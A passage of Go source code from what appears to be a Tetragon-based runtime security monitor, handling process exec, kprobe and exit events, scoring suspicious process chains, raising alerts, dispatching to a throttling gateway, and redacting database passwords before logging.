	case *tetragon.GetEventsResponse_ProcessKprobe:
		handleKprobe(ev.ProcessKprobe, st, pt, broadcast)
	case *tetragon.GetEventsResponse_ProcessExit:
		handleExit(ev.ProcessExit, broadcast)
	}
}

// handleExit forwards a slim process_exit notification onto the SSE stream so
// the UI can react immediately when a process dies. The payload carries just
// the identifying fields the client needs to locate the node — no event-store
// insert (we deliberately keep the 500-event ring buffer tied to telemetry,
// not lifecycle). The correlation-graph modal listens for this and drops the
// node when it's in Live mode.
func handleExit(ev *tetragon.ProcessExit, broadcast chan<- api.Broadcast) {
	if ev == nil || ev.Process == nil {
		return
	}
	p := ev.Process
	send(broadcast, api.Broadcast{Type: "process_exit", Payload: map[string]interface{}{
		"exec_id": p.ExecId,
		"pid":     p.Pid.GetValue(),
		"binary":  p.Binary,
	}})
}

func handleExec(ev *tetragon.ProcessExec, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	if ev == nil || ev.Process == nil {
		return
	}
	p := ev.Process
	parentID := ""
	if ev.Parent != nil {
		parentID = ev.Parent.ExecId
	}
	node := &tree.Node{
		ExecID:    p.ExecId,
		PID:       p.Pid.GetValue(),
		ParentID:  parentID,
		Binary:    p.Binary,
		Args:      p.Arguments,
		UID:       p.Uid.GetValue(),
		StartTime: time.Now(),
	}
	pt.Add(node)

	delta, reason := score.Score("process_exec", p.Binary, p.Arguments, "", p.Uid.GetValue())
	if delta > 0 {
		pt.AddScore(p.ExecId, delta, "process_exec")
	}

	parentPID := uint32(0)
	if ev.Parent != nil {
		parentPID = ev.Parent.Pid.GetValue()
	}

	e := &store.Event{
		Timestamp: time.Now(),
		EventType: "process_exec",
		PID:       p.Pid.GetValue(),
		ParentPID: parentPID,
		ExecID:    p.ExecId,
		Binary:    p.Binary,
		Args:      p.Arguments,
		UID:       p.Uid.GetValue(),
	}
	id, err := st.InsertEvent(e)
	if err != nil {
		log.Printf("insert event: %v", err)
		return
	}
	e.ID = id

	metrics.IncEvent("process_exec")
	send(broadcast, api.Broadcast{Type: "event", Payload: e})
	checkAlert(p.ExecId, st, pt, broadcast, reason)
}

func handleKprobe(ev *tetragon.ProcessKprobe, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
	if ev == nil || ev.Process == nil {
		return
	}
	p := ev.Process
	policyName := ev.PolicyName

	argStr := extractKprobeArgs(ev.Args)

	delta, reason := score.Score("process_kprobe", p.Binary, argStr, policyName, p.Uid.GetValue())
	if delta > 0 {
		pt.AddScore(p.ExecId, delta, "process_kprobe:"+policyName)
	}

	e := &store.Event{
		Timestamp:  time.Now(),
		EventType:  "process_kprobe",
		PID:        p.Pid.GetValue(),
		ExecID:     p.ExecId,
		Binary:     p.Binary,
		Args:       argStr,
		UID:        p.Uid.GetValue(),
		PolicyName: policyName,
	}
	id, err := st.InsertEvent(e)
	if err != nil {
		log.Printf("insert event: %v", err)
		return
	}
	e.ID = id

	metrics.IncEvent("process_kprobe")
	send(broadcast, api.Broadcast{Type: "event", Payload: e})
	checkAlert(p.ExecId, st, pt, broadcast, reason)
}

func extractKprobeArgs(args []*tetragon.KprobeArgument) string {
	parts := make([]string, 0, len(args))
	for _, a := range args {
		if a == nil {
			continue
		}
		if f := a.GetFileArg(); f != nil && f.Path != "" {
			parts = append(parts, f.Path)
			continue
		}
		if p := a.GetPathArg(); p != nil && p.Path != "" {
			parts = append(parts, p.Path)
			continue
		}
		if s := a.GetStringArg(); s != "" {
			parts = append(parts, s)
			continue
		}
		if v := a.GetIntArg(); v != 0 {
			parts = append(parts, fmt.Sprintf("%d", v))
			continue
		}
	}
	return strings.Join(parts, " ")
}

func checkAlert(execID string, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast, reason string) {
	chainScore := pt.ChainScore(execID)

	// Gateway runs on every event regardless of alert threshold so a
	// process can transition to "throttled" before it ever produces an
	// alert. The gateway is monotonic — repeated calls below threshold
	// are no-ops.
	dispatchGateway(execID, pt, chainScore, reason)

	if chainScore < 10 {
		return
	}
	severity := score.Severity(chainScore)
	chain := pt.Ancestors(execID, 8)
	binaries := make([]string, 0, len(chain))
	for _, n := range chain {
		binaries = append(binaries, n.Binary)
	}
	title := fmt.Sprintf("Suspicious chain: %s (score %d)", strings.Join(binaries, " → "), chainScore)
	a := &store.Alert{
		Timestamp:   time.Now(),
		Severity:    severity,
		Title:       title,
		Description: reason,
		ExecID:      execID,
		Score:       chainScore,
	}
	id, err := st.InsertAlert(a)
	if err != nil {
		log.Printf("insert alert: %v", err)
		return
	}
	a.ID = id
	metrics.IncAlert(severity)
	send(broadcast, api.Broadcast{Type: "alert", Payload: a})
	log.Printf("[ALERT %s] %s", severity, title)
}

// dispatchGateway calls the choke gateway with the latest chain score for
// an exec_id. Looks up the node in the process tree to get the canonical
// PID/binary so the enforcer has a real target. nil-safe: if the gateway
// isn't initialised (early init or tests) this is a no-op.
func dispatchGateway(execID string, pt *tree.Tree, chainScore int, reason string) {
	if gw == nil {
		return
	}
	n, ok := pt.Get(execID)
	if !ok {
		return
	}
	gw.OnEvent(context.Background(), choke.Observation{
		ExecID: execID,
		PID:    n.PID,
		Binary: n.Binary,
		Score:  chainScore,
		Reason: reason,
	})
}

func send(ch chan<- api.Broadcast, b api.Broadcast) {
	select {
	case ch <- b:
	default:
		// drop on overflow rather than block the event loop
	}
}

// splitCSV splits a comma-separated flag value into trimmed, non-empty
// fields. Used for -devchoke-iface and -devchoke-protect.
func splitCSV(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if t := strings.TrimSpace(p); t != "" {
			out = append(out, t)
		}
	}
	return out
}

// redactDSN strips the password from a Postgres DSN before logging it,
// so journald doesn't permanently capture credentials.
func redactDSN(dsn string) string {
	at := strings.LastIndex(dsn, "@")
	if at < 0 {
		return dsn
	}
	scheme := strings.Index(dsn, "://")
	if scheme < 0 || scheme >= at {
		return dsn
	}
	colon := strings.Index(dsn[scheme+3:at], ":")
	if colon < 0 {
		return dsn
	}
	return dsn[:scheme+3+colon+1] + "***" + dsn[at:]
}
